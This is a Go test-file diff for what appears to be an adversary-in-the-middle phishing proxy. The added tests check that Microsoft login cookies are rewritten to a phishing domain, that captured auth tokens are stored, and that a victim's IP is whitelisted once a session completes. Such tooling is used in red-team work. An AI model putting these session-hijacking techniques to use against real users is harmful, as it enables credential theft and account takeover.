@@ -10,6 +10,7 @@ import (
 	"regexp"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/travisbale/mirage/internal/aitm"
 	"github.com/travisbale/mirage/internal/obfuscator"
@@ -322,4 +323,167 @@ func TestJSObfuscator_DegradeGracefullyOnError(t *testing.T) {
 	if !strings.Contains(string(result), "var x=1;") {
 		t.Errorf("expected plaintext fallback on obfuscator error, got: %s", result)
 	}
+}
+
+// ---- CookieRewriter ---------------------------------------------------------
+
+func TestCookieRewriter_RewritesDomainAndForcesSecure(t *testing.T) {
+	h := &response.CookieRewriter{}
+	resp := newResp(http.StatusOK, "text/html", "")
+	resp.Header.Set("Set-Cookie", "session=abc; Domain=login.microsoft.com; Path=/")
+
+	ctx := &aitm.ProxyContext{
+		Phishlet: &aitm.PhishletDef{
+			ProxyHosts: []aitm.ProxyHost{
+				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com"},
+			},
+		},
+		PhishletCfg: &aitm.PhishletConfig{BaseDomain: "phish.example.com"},
+	}
+
+	if err := h.Handle(ctx, resp); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	setCookie := resp.Header.Get("Set-Cookie")
+	if !strings.Contains(setCookie, "phish.example.com") {
+		t.Errorf("expected domain rewritten to phish.example.com, got: %s", setCookie)
+	}
+	if !strings.Contains(setCookie, "Secure") {
+		t.Errorf("expected Secure attribute, got: %s", setCookie)
+	}
+}
+
+func TestCookieRewriter_NoDomain_PassesThrough(t *testing.T) {
+	h := &response.CookieRewriter{}
+	resp := newResp(http.StatusOK, "text/html", "")
+	resp.Header.Set("Set-Cookie", "tok=xyz; Path=/; HttpOnly")
+
+	ctx := &aitm.ProxyContext{
+		Phishlet:    &aitm.PhishletDef{},
+		PhishletCfg: &aitm.PhishletConfig{BaseDomain: "phish.example.com"},
+	}
+
+	if err := h.Handle(ctx, resp); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	setCookie := resp.Header.Get("Set-Cookie")
+	if !strings.Contains(setCookie, "tok=xyz") {
+		t.Errorf("expected original cookie value preserved, got: %s", setCookie)
+	}
+}
+
+// ---- TokenExtractor ---------------------------------------------------------
+
+type stubTokenStore struct {
+	updated *aitm.Session
+	err     error
+}
+
+func (s *stubTokenStore) UpdateSession(sess *aitm.Session) error {
+	s.updated = sess
+	return s.err
+}
+
+type stubCompleter struct{ complete bool }
+
+func (s *stubCompleter) IsComplete(_ *aitm.Session, _ *aitm.PhishletDef) bool { return s.complete }
+
+type stubWhitelister struct{ ip string }
+
+func (s *stubWhitelister) WhitelistTemporary(ip string, _ time.Duration) { s.ip = ip }
+
+func TestTokenExtractor_CapturesCookieToken(t *testing.T) {
+	store := &stubTokenStore{}
+	h := &response.TokenExtractor{
+		Store:     store,
+		Bus:       &stubBus{},
+		Completer: &stubCompleter{complete: false},
+		Logger:    discardLogger(),
+	}
+	resp := newResp(http.StatusOK, "text/html", "")
+	resp.Header.Add("Set-Cookie", "authToken=secret; Domain=login.microsoft.com; Path=/")
+
+	ctx := &aitm.ProxyContext{
+		Session: &aitm.Session{ID: "sess-1"},
+		Phishlet: &aitm.PhishletDef{
+			AuthTokens: []aitm.TokenRule{
+				{Type: aitm.TokenTypeCookie, Name: regexp.MustCompile(`^authToken$`)},
+			},
+		},
+	}
+
+	if err := h.Handle(ctx, resp); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if store.updated == nil {
+		t.Fatal("expected session to be updated after token capture")
+	}
+	if _, ok := ctx.Session.CookieTokens["login.microsoft.com"]["authToken"]; !ok {
+		t.Errorf("expected authToken captured, got: %v", ctx.Session.CookieTokens)
+	}
+}
+
+func TestTokenExtractor_NoPhishlet_Skips(t *testing.T) {
+	store := &stubTokenStore{}
+	h := &response.TokenExtractor{
+		Store:     store,
+		Bus:       &stubBus{},
+		Completer: &stubCompleter{},
+		Logger:    discardLogger(),
+	}
+	resp := newResp(http.StatusOK, "text/html", "")
+	resp.Header.Add("Set-Cookie", "tok=x; Path=/")
+
+	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if store.updated != nil {
+		t.Error("expected no store update when phishlet is nil")
+	}
+}
+
+func TestTokenExtractor_SessionCompleted_PublishesEvent(t *testing.T) {
+	bus := &stubBus{}
+	whitelister := &stubWhitelister{}
+	h := &response.TokenExtractor{
+		Store:     &stubTokenStore{},
+		Bus:       bus,
+		Completer: &stubCompleter{complete: true},
+		Whitelist: whitelister,
+		Logger:    discardLogger(),
+	}
+	resp := newResp(http.StatusOK, "text/html", "")
+	ctx := &aitm.ProxyContext{
+		ClientIP: "1.2.3.4",
+		Session:  &aitm.Session{ID: "sess-1"},
+		Phishlet: &aitm.PhishletDef{},
+	}
+
+	if err := h.Handle(ctx, resp); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if ctx.Session.CompletedAt == nil {
+		t.Error("expected CompletedAt to be set on session completion")
+	}
+	if !bus.published(aitm.EventSessionCompleted) {
+		t.Error("expected EventSessionCompleted to be published")
+	}
+	if whitelister.ip != "1.2.3.4" {
+		t.Errorf("expected IP 1.2.3.4 to be whitelisted, got %q", whitelister.ip)
+	}
+}
+
+// stubBus is a minimal event bus for tests that need to inspect published events.
+type stubBus struct{ events []aitm.Event }
+
+func (b *stubBus) Publish(e aitm.Event)                               { b.events = append(b.events, e) }
+func (b *stubBus) Subscribe(_ aitm.EventType) <-chan aitm.Event       { return make(chan aitm.Event, 1) }
+func (b *stubBus) Unsubscribe(_ aitm.EventType, _ <-chan aitm.Event) {}
+func (b *stubBus) published(t aitm.EventType) bool {
+	for _, e := range b.events {
+		if e.Type == t {
+			return true
+		}
+	}
+	return false
 }
